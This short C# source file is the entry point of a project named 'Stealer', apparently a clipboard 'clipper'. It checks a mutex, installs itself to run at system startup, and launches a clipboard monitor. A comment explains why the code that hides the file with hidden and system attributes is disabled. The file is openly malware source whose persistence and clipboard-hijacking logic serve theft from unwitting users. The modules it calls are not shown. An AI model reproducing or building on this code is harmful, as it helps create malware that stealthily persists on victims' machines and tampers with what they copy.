using System;

namespace Stealer
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThreadAttribute]
        static void Main()
        {
            // Check mutex
            Modules.AppMutex.Check();
            // Add to startup
            if (!Modules.Autorun.is_installed())
                Modules.Autorun.install();

            /* The functions are disabled because if the file is in the startup folder and it is hidden,
               then it will not be launched.
               // Set hidden & system attribtues
               Modules.Attributes.set_hidden();
               Modules.Attributes.set_system(); */

            // Start clipper
            Modules.ClipboardMonitor.run();
        }
    }
}
